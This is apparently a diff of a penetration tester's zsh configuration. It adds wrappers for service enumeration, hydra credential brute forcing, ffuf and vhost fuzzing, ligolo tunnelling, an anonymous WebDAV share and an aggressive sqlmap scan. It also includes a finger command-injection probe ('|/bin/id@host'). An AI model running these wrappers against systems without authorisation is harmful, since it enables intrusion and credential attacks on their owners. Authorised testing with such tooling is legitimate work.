@@ -1,11 +1,10 @@
-
 # ~/.zshrc file for zsh interactive shells.
 # see /usr/share/doc/zsh/examples/zshrc for examples
 
 #ENV Variables
 export PKG_CONFIG_PATH="/home/damuna/gsl/lib/pkgconfig:/home/damuna/gsl-2.7"
 export PATH="$PATH:/home/damuna/.local/bin"
-export PATH="$PATH:/home/damuna/gsl/lib/pkgconfig:/home/damuna/gsl-2.7:/snap/bin:/home/damuna/go/bin"
+export PATH="$PATH:/home/damuna/gsl/lib/pkgconfig:/home/damuna/gsl-2.7:/snap/bin:/home/damuna/go/bin:/home/damuna/.cargo/bin"
 
 setopt autocd              # change directory just by typing its name
 #setopt correct            # auto correct mistakes
@@ -521,6 +520,32 @@ nscan(){
         hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt mssql://$1:$2
     fi
 
+    if [[ "$service" == "rpc" ]]; then
+	    echo -e "\nTRYING NULL/GUEST BINDINGS\n"
+        rpcclient -U "" -N $1
+    	rpcclient -U "%" -N $1
+        rpcclient -U "Guest" -N $1
+
+        echo -e "\nCHECKING IOXID INTERFACES/IPs\n"
+        /home/kali/TOOLS/IOXIDResolver/venv/bin/python3 ~/TOOLS/IOXIDResolver/IOXIDResolver.py -t $1
+    fi
+
+    if [[ "$service" == "finger" ]]; then
+        echo -e "\nGRABBING ROOT BANNER\n"
+        echo root | nc -vn $1 $2
+
+        echo -e "\nTESTING \"/bin/id\" INJECTION\n"
+        finger "|/bin/id@$1"
+
+        echo -e "\nENUMERATING USERS (XATO-TOP-1000)\n"
+        msfconsole -q -x "use auxiliary/scanner/finger/finger_users; set RHOSTS $1; set RPORT $2; set USERS_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt; exploit; exit"
+    fi
+    
+    if [[ "$service" == "ldap" ]]; then
+        echo -e "\nTESTING NULL BINDS\n"
+        nxc ldap $1 --port $2 -u '' -p ''
+        ldapsearch -H ldap://$1:$2 -x -s base namingcontexts
+    fi
     
     if [[ "$service" == "dns" ]]; then        
         read -r ad_resp\?"IS THE DNS SERVER HANDLING AN ACTIVE DIRECTORY? (Y/N): "
@@ -892,43 +917,42 @@ gcc_ex(){
     gcc -L/home/damuna/gsl/lib $1 -O1 -g -lgmp -lm -lgsl -lgslcblas
 }
 
-
 # Content Discovery --> (Directories, Files, Backups)
 dirfuzz(){    
     echo -e "\nSEARCHING COMMON CONTENT\n"
-    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -v
-    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -v
-    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -v
-    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/all.txt -v
+    ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -v
+    ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -v
+    ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -v
+    ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/all.txt -v
 
-    echo -e "\nSEARCHING RAFT DIRECTORIES\n"
-    ffuf -ac -acs advanced -r  -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -v
-
-    echo -e "\nSEARCHING RAFT FILES\n"
-    ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -v
+    echo  -e "\nEXTENSION FUZZING COMMON\n"
+    ffuf -ac -acs advanced -r -c -u $1/FUZZ_FILEFUZZ_EXT -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt:FUZZ_FILE -w /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt:FUZZ_EXT
 
     echo -e "\nCHECKING NUCLEI HTTP EXPOSURES\n"    
     nuclei -up &>/dev/null && nuclei -ut &>/dev/null
     nuclei -u $1 -t http/exposures
 
+    echo -e "\nSEARCHING RAFT DIRECTORIES\n"
+    ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -v
+
+    echo -e "\nSEARCHING RAFT FILES\n"
+    ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -v
+
+    echo -e "\nFULL DIRECTORY SEARCH\n"
+    ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -v
+
     read -r cel\?"INPUT ENDPOINT FOR GENERATED FUZZING IF NEEDED (Current -> \"$1\"): "
     if [[ ! -z $cel ]]; then
         echo -e "\nGENERATED FUZZING\n"
         cewl $cel -d 4 -m 3 --lowercase --with-numbers --convert-umlauts -w /tmp/$(echo $1 | unfurl format %d).txt
-        ffuf -ac -acs advanced -r  -u $1/FUZZ/ -c -w /tmp/$(echo $1 | unfurl format %d).txt -v 
+        ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ/ -c -w /tmp/$(echo $1 | unfurl format %d).txt -v 
         rm /tmp/$(echo $1 | unfurl format %d).txt
     fi
 
-    echo -e "\nBIGGER DIRECTORY SEARCH\n"
-    ffuf -ac -acs advanced -r  -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -v
-
     read -r resp\?"INPUT EXTENSION FOR BACKEND & BACKUP FUZZING: "
     if [[ ! -z $resp ]]; then
-        ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e $resp,$resp.old,$resp.bak,$resp.tmp,$resp~,old,bak,tmp -v
+        ffuf -t 10 -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e $resp,$resp.old,$resp.bak,$resp.tmp,$resp~,old,bak,tmp -v
     fi
-
-    echo -e "\nSEARCHING ALL WEB EXTENSIONS\n"
-    ffuf -ac -acs advanced -r  -u $1/FUF1FUF2 -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUF1 -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUF2 -v
 }
 
 
@@ -978,7 +1002,7 @@ smbserv(){
 webdavserv(){
     chnic
     echo -e "\nOPENING WEBDAV AT http://$ip:8000\n FROM /tmp"
-    wsgidav --host=$ip --port=8000 --root=/tmp --auth=anonymous
+    wsgidav --host=$ip --port=8000 --root=$(pwd) --auth=anonymous
 }
 # Created by `pipx` on 2024-09-26 13:58:11
 export PATH="$PATH:/home/damuna/.local/bin"
@@ -988,7 +1012,10 @@ paramfuzz(){
     nuclei -u $1 -headless -dast
 }
 
-
+ligcreate(){
+    sudo ip tuntap add user `whoami` mode tun $1 2>/dev/null
+    sudo ip link set $1 up 2>/dev/null
+}
 
 # web enumeration
 web_enum(){
@@ -1018,10 +1045,14 @@ alive(){
         sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 -iL $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt
 
     elif [[ $1 =~ $cidr_regex ]]; then
+        echo -e "\nFPING SWEEPING\n"
+        fping -asgq $1
+
         echo -e "\nNMAP SWEEPING\n"
         sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt
     fi
 }
+
 
 
 vhost(){
@@ -1033,22 +1064,23 @@ vhost(){
         if [[ -z $wd ]]; then
             wd="/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
         fi
-    ffuf -mc all -ac -acs advanced -u $1 -c -w $wd -H "Host: FUZZ.$host"
+    
+    ffuf -mc all -ac -acs advanced -u $1 -c -w "$wd:FUZZ" -H "Host: FUZZ.$host" "${@:2}"
 }
 
 #Crawling/JS Scraping Function
 crawl(){
         echo -e "\nURLS + SUBDOMAINS\n"
-        gospider -s $1 --sitemap -d 1 --subs | grep -vE "\.js$" | grep -E "\[url\]|\[subdomains\]"
+        gospider -s $1 --sitemap -d 3 --subs | grep -vE "\.js$" | grep -E "\[url\]|\[subdomains\]"
 
         echo -e "\nHREF ATTRIBUTES\n"
-        gospider -s $1 --sitemap -d 1 --subs | grep "\[href\]"
+        gospider -s $1 --sitemap -d 3 --subs | grep "\[href\]"
 
         echo -e "\nJAVASCRIPT FILES\n"
-        gospider -s $1 --sitemap -d 1 --subs | grep "\[javascript\]"
+        gospider -s $1 --sitemap -d 3 --subs | grep "\[javascript\]"
 
         echo -e "\nFORMS\n"
-        gospider -s $1 --sitemap -d 1 --subs | grep "\[form\]"
+        gospider -s $1 --sitemap -d 3 --subs | grep "\[form\]"
 
         echo -e "\nQUERY STRINGS\n"
         python3 ~/TOOLS/ReconSpider.py $1 &>/dev/null
@@ -1093,7 +1125,7 @@ dnsrec(){
 ligstart(){
     sudo ip tuntap add user `whoami` mode tun ligolo 2>/dev/null
     sudo ip link set ligolo up 2>/dev/null
-    ~/TOOLS/ligolo-ng/dist/ligolo-ng-proxy-linux_amd64 -selfcert
+    ligolo-proxy -selfcert
 }
 
 # Default credentials for services / applications
@@ -1280,4 +1312,62 @@ chnic(){
     read -r nic\?"SELECT NIC (${nic_lst%?}): "
     export inter=$nic
     export ip=$(ifconfig $inter 2>/dev/null | awk -F" " '{print $2}' | sed -n '2 p')
+}
+
+alias copyfile='xclip -sel clip'
+
+# GET/POST/Header discovery
+paramscan(){
+    vared -p "INPUT THE WORDLIST for vhosts (leave empty to use burp-parameter): " -c wd
+        if [[ -z $wd ]]; then
+            wd = /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+        fi
+
+    echo "\nX8 SEARCH (GET/POST)\n"    
+    x8 -u $1 -X GET POST -w $wd
+
+    echo -e "\nX8 SEARCH (JSON)\n"
+    x8 -u $1 -X POST -w $wd -t json
+}
+
+# Usernames Generation
+usergen(){
+    echo -e "\nGENERATING USERNAMES\n"
+    ~/TOOLS/username-anarchy/username-anarchy -i $1 > gen_users.txt
+}
+
+# Neo4j server
+neostart(){
+    sudo neo4j console
+}
+
+# Add/Extend Host Mappings of /etc/hosts
+addhost() {
+    ip="$1"
+    hostname="$2"
+    if grep -q "^$ip" /etc/hosts; then
+      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
+      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
+    else
+      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
+      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
+    fi
+
+    grep "^$ip" /etc/hosts
+}
+
+# AD Realm Setting Function
+krbconf(){
+    sudo python3 ~/.local/bin/configure_krb5.py $1 $2
+    sudo timedatectl set-ntp off
+    sudo rdate -n $2.$1
+}
+
+# SQLMap Scan Wrapper
+sqlscan(){ 
+    echo -e "\nSCANNING REQUEST \"$1\" FOR SQL INJECTION WITH ALL METHODS\n"
+    echo -e "----------------------------------"
+    cat $1
+    echo -e "----------------------------------"
+    sqlmap -r $1 --level 5 --risk 3 --threads=10 --random-agent --batch --dbs --fingerprint --banner --technique=BEUSQT --flush-session --parse-errors --fresh-queries --no-cast --no-escape -v 2
 }
